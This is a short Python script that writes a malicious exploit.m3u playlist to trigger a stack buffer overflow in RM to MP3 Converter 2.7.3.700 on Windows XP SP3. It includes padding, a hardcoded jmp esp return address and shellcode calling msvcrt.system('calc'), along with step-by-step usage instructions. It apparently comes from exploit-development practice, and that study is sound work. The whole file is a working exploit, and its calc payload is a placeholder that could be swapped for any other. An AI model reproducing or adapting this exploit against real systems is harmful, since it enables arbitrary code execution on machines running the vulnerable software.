#!/usr/bin/env python3

# Exploit file to pop calc.exe for RM to MP3 Converter v2.7.3.700 on Windows XP.
# How 2 use:
#   Generate the exploit.m3u file by running this script
#   Load the exploit.m3u file into the RM to MP3 Converter
#   Hope that the exploit works (because it's pretty unreliable :( )
#   If it doesn't work, try again until it does!
#
# Note: executes shellcode in the stack; does NOT defeat DEP.
# Tested on Windows XP SP3.

print("Creating exploit.m3u exploit file...")

# Uses hardcoded MSVCRT address for `system("calc")`
# from http://shell-storm.org/shellcode/files/shellcode-739.php
exploit = "A"*26074                 # Padding
exploit += "\x27\x3b\xcd\x01"       # Address of `jmp esp` in MSRMCcodec02.dll
exploit += "B"*4                    # More padding

# Shellcode for `msvcrt.system("calc")` (`esp` points here)
exploit += "\x31\xC9"               # xor ecx, ecx
exploit += "\x51"                   # push ecx
exploit += "\x68\x63\x61\x6C\x63"   # push 'calc'
exploit += "\x54"                   # push DWORD PTR esp
exploit += "\xB8\xC7\x93\xC2\x77"   # mov eax,0x77c293c7 (`msvcrt.system`)
exploit += "\xFF\xD0"               # call eax

# Write the file
with open("exploit.m3u", "wb") as f:
    # Encoding iso8859-1 to preserve extended ASCII range!
    f.write(exploit.encode('iso8859-1'))

print("Exploit file created!")
